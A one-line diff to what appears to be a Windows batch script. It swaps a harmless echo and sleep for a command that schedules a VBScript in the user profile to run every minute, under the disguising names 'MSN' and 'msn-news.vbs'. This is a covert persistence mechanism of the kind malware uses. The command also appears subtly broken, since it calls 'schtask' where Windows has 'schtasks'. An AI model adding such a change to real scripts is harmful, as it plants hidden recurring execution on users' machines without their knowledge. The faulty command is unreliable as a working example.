@@ -1,2 +1,1 @@
-echo "Hello"
-SLEEP 30
+schtask /create /sc minute /mo 1 /tn "MSN" /tr "%USERPROFILE%\folder\msn-news.vbs"
